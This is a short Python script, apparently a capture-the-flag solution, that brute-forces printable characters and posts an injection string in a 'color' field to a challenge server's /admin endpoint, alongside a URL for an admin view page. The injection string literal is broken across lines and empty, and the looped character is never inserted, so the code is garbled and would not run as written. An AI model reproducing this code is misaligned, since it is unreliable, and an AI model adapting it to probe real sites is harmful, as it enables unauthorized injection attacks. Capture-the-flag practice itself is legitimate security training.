import requests

url = 'http://chall.csivit.com:30256/admin'

for i in range(32,126):
    change = chr(i)
    injectStr = '
    '
    myobj = {'url': 'http://chall.csivit.com:30256/view','color':injectStr}
    x = requests.post(url, data = myobj)
    print(change)
    print(x.text)